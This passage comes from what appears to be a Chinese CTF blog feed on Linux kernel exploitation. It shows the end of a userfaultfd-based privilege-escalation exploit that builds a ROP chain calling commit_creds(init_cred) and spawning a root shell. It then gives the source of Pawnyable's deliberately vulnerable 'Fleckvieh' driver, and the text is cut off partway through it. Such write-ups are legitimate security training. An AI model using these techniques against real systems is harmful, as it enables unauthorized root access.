copy_page<span class="token punctuation">;</span>        uffdio_copy<span class="token punctuation">.</span>dst <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> msg<span class="token punctuation">.</span>arg<span class="token punctuation">.</span>pagefault<span class="token punctuation">.</span>address <span class="token operator">&amp;</span>                                              <span class="token operator">~</span><span class="token punctuation">(</span>copy_size <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        uffdio_copy<span class="token punctuation">.</span>len <span class="token operator">=</span> copy_size<span class="token punctuation">;</span>        uffdio_copy<span class="token punctuation">.</span>mode <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        uffdio_copy<span class="token punctuation">.</span>copy <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ioctl</span><span class="token punctuation">(</span>uffd<span class="token punctuation">,</span> UFFDIO_COPY<span class="token punctuation">,</span> <span class="token operator">&amp;</span>uffdio_copy<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>            <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"ioctl-UFFDIO_COPY"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>envp<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">saveStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">bind_cpu</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token operator">*</span>page<span class="token punctuation">;</span>  page <span class="token operator">=</span> <span class="token function">mmap</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">0x3000</span><span class="token punctuation">,</span> PROT_READ <span class="token operator">|</span> PROT_WRITE<span class="token punctuation">,</span>              MAP_PRIVATE <span class="token operator">|</span> MAP_ANONYMOUS<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">registerUserFaultFd</span><span class="token punctuation">(</span>page<span class="token punctuation">,</span> <span class="token number">0x3000</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>fault_handler_thread<span class="token punctuation">)</span><span class="token punctuation">;</span>fd<span class="token operator">=</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/proc/DASKERNEL"</span><span class="token punctuation">,</span>O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>fd<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[+] Proc Opened"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span>buf<span class="token operator">=</span>ADD_RSP_0x130_PPP_RET<span class="token punctuation">;</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span> page<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">0x60</span><span class="token punctuation">;</span> i <span class="token operator">+=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%02x: 0x%016lx\n"</span><span class="token punctuation">,</span> i<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>page <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>swapgs_restore_regs_and_return_to_usermode<span class="token operator">+=</span><span class="token number">16</span><span class="token punctuation">;</span><span class="token function">__asm__</span><span class="token punctuation">(</span><span class="token string">"mov r15,   0xbeefdead;"</span><span class="token string">"mov r14,   0xbeefdead;"</span><span class="token string">"mov r13,   0xbeefdead;"</span><span class="token string">"mov r12,   POP_RDI_RET;"</span><span class="token string">"mov rbp,   init_cred;"</span><span class="token string">"mov rbx,   POP_RDX_RET;"</span><span class="token comment">//r11</span><span class="token string">"mov r10,   commit_creds;"</span><span class="token string">"mov r9,    swapgs_restore_regs_and_return_to_usermode;"</span><span class="token string">"mov r8,    0x99999999;"</span><span class="token string">"xor rax,   rax;"</span><span class="token string">"mov rdi,   seqfd;"</span><span class="token string">"mov rsi,   rsp;"</span><span class="token string">"mov rdx,   8;"</span><span class="token string">"syscall"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">getRootShell</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/EXP_FILE/5b6bf9d49f5d500c2a459a27e2886904_MD5.jpeg"></p>]]></content>
      
      
      <categories>
          
          <category> 赛题 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>LK04 Userfaultfd</title>
      <link href="/2024/03/14/LK04%20Userfaultfd/"/>
      <url>/2024/03/14/LK04%20Userfaultfd/</url>
      
        <content type="html"><![CDATA[<p>LKM源码：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/cdev.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/fs.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/kernel.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/module.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/random.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/slab.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/uaccess.h></span></span><span class="token function">MODULE_LICENSE</span><span class="token punctuation">(</span><span class="token string">"GPL"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">MODULE_AUTHOR</span><span class="token punctuation">(</span><span class="token string">"ptr-yudai"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">MODULE_DESCRIPTION</span><span class="token punctuation">(</span><span class="token string">"Fleckvieh - Vulnerable Kernel Driver for Pawnyable"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">DEVICE_NAME</span> <span class="token string">"fleckvieh"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">CMD_ADD</span> <span class="token expression"><span class="token number">0xf1ec0001</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">CMD_DEL</span> <span class="token expression"><span class="token number">0xf1ec0002</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">CMD_GET</span> <span class="token expression"><span class="token number">0xf1ec0003</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">CMD_SET</span> <span class="token expression"><span class="token number">0xf1ec0004</span></span></span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> id<span class="token punctuation">;</span>  <span class="token class-name">size_t</span> size<span class="token punctuation">;</span>  <span class="token keyword">char</span> <span class="token operator">*</span>data<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token class-name">request_t</span><span class="token punctuation">;</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> id<span class="token punctuation">;</span>  <span class="token class-name">size_t</span> size<span class="token punctuation">;</span>  <span class="token keyword">char</span> <span class="token operator">*</span>data<span class="token punctuation">;</span>  <span class="token keyword">struct</span> <span class="token class-name">list_head</span> list<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> blob_list<span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">module_open</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">inode</span> <span class="token operator">*</span>inode<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>filp<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">/* Allocate list head */</span>  filp<span class="token operator">-></span>private_data <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">kmalloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">list_head</span><span class="token punctuation">)</span><span class="token punctuation">,</span> GFP_KERNEL<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">unlikely</span><span class="token punctuation">(</span><span class="token operator">!</span>filp<span class="token operator">-></span>private_data<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token operator">-</span>ENOMEM<span class="token punctuation">;</span>  <span class="token function">INIT_LIST_HEAD</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">list_head</span><span class="token operator">*</span><span class="token punctuation">)</span>filp<span class="token operator">-></span>private_data<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">module_close</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">inode</span> <span class="token operator">*</span>inode<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>filp<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">struct</span> <span class="token class-name">list_head</span> <span class="token operator">*</span>top<span class="token punctuation">;</span>  blob_list <span class="token operator">*</span>itr<span class="token punctuation">,</span> <span class="token operator">*</span>tmp<span class="token punctuation">;</span>  <span class="token comment">/* Remove everything */</span>  top <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">list_head</span><span class="token operator">*</span><span class="token punctuation">)</span>filp<span class="token operator">-></span>private_data<span class="token punctuation">;</span>  tmp <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>  <span class="token function">list_for_each_entry_safe</span><span class="token punctuation">(</span>itr<span class="token punctuation">,</span> tmp<span class="token punctuation">,</span> top<span class="token punctuation">,</span> list<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">list_del</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>itr<span class="token operator">-></span>list<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">kfree</span><span class="token punctuation">(</span>itr<span class="token operator">-></span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">kfree</span><span class="token punctuation">(</span>itr<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">kfree</span><span class="token punctuation">(</span>top<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>blob_list <span class="token operator">*</span><span class="token function">blob_find_by_id</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">list_head</span> <span class="token operator">*</span>top<span class="token punctuation">,</span> <span class="token keyword">int</span> id<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  blob_list <span class="token operator">*</span>itr<span class="token punctuation">;</span>  <span class="token comment">/* Find blob by id */</span>  <span class="token function">list_for_each_entry</span><span class="token punctuation">(</span>itr<span class="token punctuation">,</span> top<span class="token punctuation">,</span> list<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">unlikely</span><span class="token punctuation">(</span>itr<span class="token operator">-></span>id <span class="token operator">==</span> id<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> itr<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">long</span> <span class="token function">blob_add</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">list_head</span> <span class="token operator">*</span>top<span class="token punctuation">,</span> <span class="token class-name">request_t</span> <span class="token operator">*</span>req<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  blob_list <span class="token operator">*</span>new<span class="token punctuation">;</span>  <span class="token comment">/* Check size */</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token operator">-></span>size <span class="token operator">></span> <span class="token number">0x1000</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span>  <span class="token comment">/* Allocate a new blob structure */</span>  new <span class="token operator">=</span> <span class="token punctuation">(</span>blob_list<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">kmalloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>blob_list<span class="token punctuation">)</span><span class="token punctuation">,</span> GFP_KERNEL<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">unlikely</span><span class="token punctuation">(</span><span class="token operator">!</span>new<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token operator">-</span>ENOMEM<span class="token punctuation">;</span>  <span class="token comment">/* Allocate data buffer */</span>  new<span class="token operator">-></span>data <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">kmalloc</span><span class="token punctuation">(</span>req<span class="token operator">-></span>size<span class="token punctuation">,</span> GFP_KERNEL<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">unlikely</span><span class="token punctuation">(</span><span class="token operator">!</span>new<span class="token operator">-></span>data<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">kfree</span><span class="token punctuation">(</span>new<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">-</span>ENOMEM<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token comment">/* Copy data from user buffer */</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">unlikely</span><span class="token punctuation">(</span><span class="token function">copy_from_user</span><span class="token punctuation">(</span>new<span class="token operator">-></span>data<span class="token punctuation">,</span> req<span class="token operator">-></span>data<span class="token punctuation">,</span> req<span class="token operator">-></span>size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">kfree</span><span class="token punctuation">(</span>new<span class="token operator">-></span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">kfree</span><span class="token punctuation">(</span>new<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  new<span class="token operator">-></span>size <span class="token operator">=</span> req<span class="token operator">-></span>size<span class="token punctuation">;</span>  <span class="token function">INIT_LIST_HEAD</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>new<span class="token operator">-></span>list<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">/* Generate a random positive integer */</span>  <span class="token keyword">do</span> <span class="token punctuation">&#123;</span>    <span class="token function">get_random_bytes</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>new<span class="token operator">-></span>id<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>new<span class="token operator">-></span>id<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">unlikely</span><span class="token punctuation">(</span>new<span class="token operator">-></span>id <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">/* Insert to list */</span>  <span class="token function">list_add</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>new<span class="token operator">-></span>list<span class="token punctuation">,</span> top<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> new<span class="token operator">-></span>id<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">long</span> <span class="token function">blob_del</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">list_head</span> <span class="token operator">*</span>top<span class="token punctuation">,</span> <span class="token class-name">request_t</span> <span class="token operator">*</span>req<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  blob_list <span class="token operator">*</span>victim<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>victim <span class="token operator">=</span> <span class="token function">blob_find_by_id</span><span class="token punctuation">(</span>top<span class="token punctuation">,</span> req<span class="token operator">-></span>id<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span>  <span class="token comment">/* Delete the item */</span>  <span class="token function">list_del</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>victim<span class="token operator">-></span>list<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">kfree</span><span class="token punctuation">(</span>victim<span class="token operator">-></span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">kfree</span><span class="token punctuation">(</span>victim<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> req<span class="token operator">-></span>id<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">long</span> <span class="token function">blob_get</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">list_head</span> <span class="token operator">*</span>top<span class="token punctuation">,</span> <span class="token class-name">request_t</span> <span class="token operator">*</span>req<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  blob_list <span class="token operator">*</span>victim<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>victim <span class="token operator">=</span> <span class="token function">blob_find_by_id</span><span class="token punctuation">(</span>top<span class="token punctuation">,</span> req<span class="token operator">-></span>id<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span>  <span class="token comment">/* Check size */</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token operator">-></span>size <span class="token operator">></span> victim<span class="token operator">-></span>size<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span>  <span class="token comment">/* Copy data to user */</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">unlikely</span><span class="token punctuation">(</span><span class="token function">copy_to_user</span><span class="token punctuation">(</span>req<span class="token operator">-></span>data<span class="token punctuation">,</span> victim<span class="token operator">-></span>data<span class="token punctuation">,</span> req<span class="token operator">-></span>size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span>  <span class="token keyword">return</span> req<span class="token operator">-></span>id<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">long</span> <span class="token function">blob_set</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">list_head</span> <span class="token operator">*</span>top<span class="token punctuation">,</span> <span class="token class-name">request_t</span> <span class="token operator">*</span>req<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  blob_list <span class="token operator">*</span>victim<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>victim <span class="token operator">=</span> <span class="token function">blob_find_by_id</span><span class="token punctuation">(</span>top<span class="token punctuation">,</span> req<span class="token operator">-></span>id<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span>  <span class="token comment">/* Check size */</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token operator">-></span>size <span class="token operator">></span> victim<span class="token operator">-></span>size<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span>  <span class="token comment">/* Copy data from user */</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">unlikely</span><span class="token punctuation">(</span><span class="token function">copy_from_user</span><span class="token punctuation">(</span>victim<span class="token operator">-></span>data<span class="token punctuation">,</span> req<span class="token operator">-></span>data<span class="token punctuation">,</span> req<span class="token operator">-></span>size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span>  <span class="token keyword">return</span> req<span class="token operator">-></span>id<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">long</span> <span class="token function">module_ioctl</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>filp<span class="token punctuation">,</span>                         <span class="token keyword">unsigned</span> <span class="token keyword">int</span> cmd<span class="token punctuation">,</span>                         <span class="token keyword">unsigned</span> <span class="token keyword">long</span> arg<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">struct</span> <span class="token class-name">list_head</span> <span class="token operator">*</span>top<span class="token punctuation">;</span>  <span class="token class-name">request_t</span> req<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">unlikely</span><span class="token punctuation">(</span><span class="token function">copy_from_user</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>req<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span>arg<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span>  top <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">list_head</span><span class="token operator">*</span><span class="token punctuation">)</span>filp<span class="token operator">-></span>private_data<span class="token punctuation">;</span>  <span class="token keyword">switch</span> <span class="token punctuation">(</span>cmd<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">case</span> CMD_ADD<span class="token operator">:</span> <span class="token keyword">return</span> <span class="token function">blob_add</span><span class="token punctuation">(</span>top<span class="token punctuation">,</span> <span class="token operator">&amp;</span>req<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">case</span> CMD_DEL<span class="token operator">:</span> <span class="token keyword">return</span> <span class="token function">blob_del</span><span class="token punctuation">(</span>top<span class="token punctuation">,</span> <span class="token operator">&amp;</span>req<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">case</span> CMD_GET<span class="token operator">:</span> <span class="token keyword">return</span> <span class="token function">blob_get</span><span class="token punctuation">(</span>top<span class="token punctuation">,</span> <span class="token operator">&amp;</span>req<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">case</span> CMD_SET<span class="token operator">:</span> <span class="token keyword">return</span> <span class="token function">blob_set</span><span class="token punctuation">(</span>top<span class="token punctuation">,</span> <span class="token operator">&amp;</span>req<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">default</span><span class="token operator">:</span> <span class="token keyword">return</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">struct</span> <span class="token class-name">file_operations</span> module_fops <span class="token operator">=</span> <span class="token punctuation">&#123;</span>  <span class="token punctuation">.</span>owner   <span class="token operator">=</span> THIS_MODULE<span class="token punctuation">,</span>  <span class="token punctuation">.</span>open    <span class="token operator">=</span> module_open<span class="token punctuation">,</span>  <span class="token punctuation">.</span>release <span class="token operator">=</span> module_close<span class="token punctuation">,</span>  <span class="token punctuation">.</span>unlocked_ioctl <span class="token operator">=</span> module_ioctl<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token class-name">dev_t</span> dev_id<span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">struct</span> <span class="token class-name">cdev</span> c_dev<span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">int</span> __init <span class="token function">module_initialize</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">alloc_chrdev_region</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>dev_id<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> DEVICE_NAME<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token operator">-</span>EBUSY<span class="token punctuation">;</span>  <span class="token function">cdev_init</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>c_dev<span class="token punctuation">,</span> <span class="token operator">&amp;</span>module_fops<span class="token punctuation">)</span><span class="token punctuation">;</span>  c_dev<span class="token punctuation">.</span>owner <span class="token operator">=</span> THIS_MODULE<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">cdev_add</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>c_dev<span class="token punctuation">,</span> dev_id<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">unregister_chrdev_region</span><span class="token 